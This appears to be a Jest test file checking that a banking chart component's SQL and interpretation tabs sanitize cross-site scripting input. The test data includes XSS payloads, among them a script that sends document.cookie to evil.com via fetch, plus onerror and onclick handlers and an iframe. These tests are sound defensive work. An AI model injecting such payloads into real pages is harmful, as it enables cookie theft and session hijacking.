import React from "react";
import { render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { BankChartCanvasView } from "../BankChartCanvasView";
import type { BankChartData } from "@/lib/types";

// Mock react-plotly.js
jest.mock("react-plotly.js", () => {
  return function MockPlot() {
    return <div data-testid="mock-plot">Mocked Plotly Chart</div>;
  };
});

describe("BankChartCanvasView - XSS Protection", () => {
  const createMockData = (
    sqlQuery?: string,
    interpretation?: string,
  ): BankChartData => ({
    metric_name: "imor",
    bank_names: ["INVEX", "BBVA"],
    time_range: {
      start: "2023-01-01",
      end: "2023-12-31",
    },
    plotly_config: {
      data: [
        {
          x: ["2023-01"],
          y: [100],
          type: "bar",
          name: "INVEX",
        },
      ],
      layout: {
        title: "Test Chart",
        xaxis: { title: "Date" },
        yaxis: { title: "Value" },
      },
    },
    data_as_of: "2024-01-01T00:00:00Z",
    metadata: {
      sql_generated: sqlQuery,
      metric_interpretation: interpretation,
    },
  });

  describe("SQL Query Sanitization", () => {
    it("should sanitize XSS script tags in SQL query", async () => {
      const user = userEvent.setup();
      const maliciousSQL = 'SELECT * FROM banks; <script>alert("XSS")</script>';
      const data = createMockData(maliciousSQL);

      render(<BankChartCanvasView data={data} />);

      const sqlTab = screen.getByText("SQL Query");
      await user.click(sqlTab);

      // Check sanitized content is displayed
      expect(screen.getByText(/SELECT \* FROM banks/)).toBeInTheDocument();

      const preElement = screen
        .getByText(/SELECT \* FROM banks/)
        .closest("pre");
      expect(preElement?.textContent).not.toContain("<script>");
      expect(preElement?.textContent).not.toContain("alert(");
    });

    it("should sanitize HTML tags in SQL query", async () => {
      const user = userEvent.setup();
      const maliciousSQL =
        'SELECT * FROM banks WHERE name = "<img src=x onerror=alert(1)>"';
      const data = createMockData(maliciousSQL);

      render(<BankChartCanvasView data={data} />);

      const sqlTab = screen.getByText("SQL Query");
      await user.click(sqlTab);

      const preElement = screen
        .getByText(/SELECT \* FROM banks/)
        .closest("pre");
      expect(preElement?.textContent).not.toContain("<img");
      expect(preElement?.textContent).not.toContain("onerror");
    });

    it("should allow plain SQL text", async () => {
      const user = userEvent.setup();
      const validSQL =
        "SELECT metric_name, value FROM bank_metrics WHERE year = 2023";
      const data = createMockData(validSQL);

      render(<BankChartCanvasView data={data} />);

      const sqlTab = screen.getByText("SQL Query");
      await user.click(sqlTab);

      expect(screen.getByText(validSQL)).toBeInTheDocument();
    });

    it("should handle SQL with special characters", async () => {
      const user = userEvent.setup();
      const sqlWithSpecialChars =
        "SELECT * FROM banks WHERE name LIKE '%INVEX%' AND value > 100";
      const data = createMockData(sqlWithSpecialChars);

      render(<BankChartCanvasView data={data} />);

      const sqlTab = screen.getByText("SQL Query");
      await user.click(sqlTab);

      expect(screen.getByText(sqlWithSpecialChars)).toBeInTheDocument();
    });
  });

  describe("Interpretation Sanitization", () => {
    it("should sanitize script tags in interpretation", async () => {
      const user = userEvent.setup();
      const maliciousInterpretation =
        'El IMOR es un indicador clave. <script>fetch("https://evil.com?cookie=" + document.cookie)</script>';
      const data = createMockData(undefined, maliciousInterpretation);

      render(<BankChartCanvasView data={data} />);

      const interpretationTab = screen.getByText("Interpretación");
      await user.click(interpretationTab);

      // Should render text but not execute script
      expect(
        screen.getByText(/El IMOR es un indicador clave/),
      ).toBeInTheDocument();

      // Get the content container
      const container = screen.getByText(
        /El IMOR es un indicador clave/,
      ).parentElement;
      expect(container?.innerHTML).not.toContain("<script>");
      expect(container?.innerHTML).not.toContain("fetch(");
    });

    it("should allow safe HTML formatting tags", async () => {
      const user = userEvent.setup();
      const safeInterpretation =
        "<p>El <strong>IMOR</strong> es un indicador clave.</p><p>Muestra <em>morosidad</em> bancaria.</p>";
      const data = createMockData(undefined, safeInterpretation);

      render(<BankChartCanvasView data={data} />);

      const interpretationTab = screen.getByText("Interpretación");
      await user.click(interpretationTab);

      // Should preserve safe formatting tags - use getAllByText since IMOR appears in header too
      const imorElements = screen.getAllByText("IMOR");
      const strongIMOR = imorElements.find((el) => el.tagName === "STRONG");
      expect(strongIMOR).toBeDefined();

      const em = screen.getByText("morosidad");
      expect(em.tagName).toBe("EM");
    });

    it("should sanitize event handlers in allowed tags", async () => {
      const user = userEvent.setup();
      const maliciousInterpretation =
        '<p onclick="alert(1)">El IMOR es un <strong onmouseover="alert(2)">indicador</strong> clave.</p>';
      const data = createMockData(undefined, maliciousInterpretation);

      render(<BankChartCanvasView data={data} />);

      const interpretationTab = screen.getByText("Interpretación");
      await user.click(interpretationTab);

      // Should keep text but remove event handlers
      expect(screen.getByText(/El IMOR es un/)).toBeInTheDocument();

      const container = screen.getByText(/El IMOR es un/).parentElement;
      expect(container?.innerHTML).not.toContain("onclick");
      expect(container?.innerHTML).not.toContain("onmouseover");
    });

    it("should sanitize dangerous tags but keep safe ones", async () => {
      const user = userEvent.setup();
      const mixedInterpretation = `
        <p>Interpretación del IMOR:</p>
        <ul>
          <li><strong>Punto 1:</strong> Análisis de cartera</li>
          <li><em>Punto 2:</em> Evaluación de riesgo</li>
        </ul>
        <iframe src="https://evil.com"></iframe>
        <script>alert("XSS")</script>
      `;
      const data = createMockData(undefined, mixedInterpretation);

      render(<BankChartCanvasView data={data} />);

      const interpretationTab = screen.getByText("Interpretación");
      await user.click(interpretationTab);

      // Should keep safe content
      expect(screen.getByText(/Interpretación del IMOR/)).toBeInTheDocument();
      expect(screen.getByText(/Punto 1:/)).toBeInTheDocument();

      const container = screen.getByText(
        /Interpretación del IMOR/,
      ).parentElement;

      // Should preserve safe tags
      expect(container?.querySelector("ul")).toBeInTheDocument();
      expect(container?.querySelector("li")).toBeInTheDocument();
      expect(container?.querySelector("strong")).toBeInTheDocument();

      // Should remove dangerous tags
      expect(container?.querySelector("iframe")).not.toBeInTheDocument();
      expect(container?.querySelector("script")).not.toBeInTheDocument();
      expect(container?.innerHTML).not.toContain("evil.com");
    });

    it("should handle code tags safely", async () => {
      const user = userEvent.setup();
      const interpretationWithCode =
        "<p>Fórmula: <code>IMOR = Cartera Vencida / Cartera Total</code></p>";
      const data = createMockData(undefined, interpretationWithCode);

      render(<BankChartCanvasView data={data} />);

      const interpretationTab = screen.getByText("Interpretación");
      await user.click(interpretationTab);

      expect(screen.getByText(/Fórmula:/)).toBeInTheDocument();

      const container = screen.getByText(/Fórmula:/).parentElement;
      expect(container?.querySelector("code")).toBeInTheDocument();
    });
  });

  describe("Tab Visibility with Sanitization", () => {
    it("should not show SQL tab if sanitization results in empty string", () => {
      const onlyScriptSQL = '<script>alert("XSS")</script>';
      const data = createMockData(onlyScriptSQL);

      render(<BankChartCanvasView data={data} />);

      // SQL tab should not be visible if sanitized content is empty
      expect(screen.queryByText("SQL Query")).not.toBeInTheDocument();
    });

    it("should not show interpretation tab if sanitization results in empty string", () => {
      const onlyScriptInterpretation = '<script>alert("XSS")</script>';
      const data = createMockData(undefined, onlyScriptInterpretation);

      render(<BankChartCanvasView data={data} />);

      // Interpretation tab should not be visible if sanitized content is empty
      expect(screen.queryByText("Interpretación")).not.toBeInTheDocument();
    });

    it("should show both tabs when content is valid after sanitization", () => {
      const validSQL = "SELECT * FROM banks";
      const validInterpretation = "<p>El IMOR es importante</p>";
      const data = createMockData(validSQL, validInterpretation);

      render(<BankChartCanvasView data={data} />);

      expect(screen.getByText("SQL Query")).toBeInTheDocument();
      expect(screen.getByText("Interpretación")).toBeInTheDocument();
    });
  });

  describe("Edge Cases", () => {
    it("should handle null/undefined metadata gracefully", () => {
      const data = createMockData();
      data.metadata = {};

      render(<BankChartCanvasView data={data} />);

      // Only chart tab should be visible
      expect(screen.getByText("Gráfica")).toBeInTheDocument();
      expect(screen.queryByText("SQL Query")).not.toBeInTheDocument();
      expect(screen.queryByText("Interpretación")).not.toBeInTheDocument();
    });

    it("should handle empty strings", () => {
      const data = createMockData("", "");

      render(<BankChartCanvasView data={data} />);

      // Empty strings should not show tabs
      expect(screen.queryByText("SQL Query")).not.toBeInTheDocument();
      expect(screen.queryByText("Interpretación")).not.toBeInTheDocument();
    });

    it("should handle very long malicious content", async () => {
      const user = userEvent.setup();
      const longMaliciousSQL =
        "<script>alert('XSS')</script>".repeat(100) + "SELECT * FROM banks";
      const data = createMockData(longMaliciousSQL);

      render(<BankChartCanvasView data={data} />);

      const sqlTab = screen.getByText("SQL Query");
      await user.click(sqlTab);

      const preElement = screen
        .getByText(/SELECT \* FROM banks/)
        .closest("pre");
      // Should sanitize all script tags
      expect(preElement?.textContent).not.toContain("<script>");
    });
  });
});
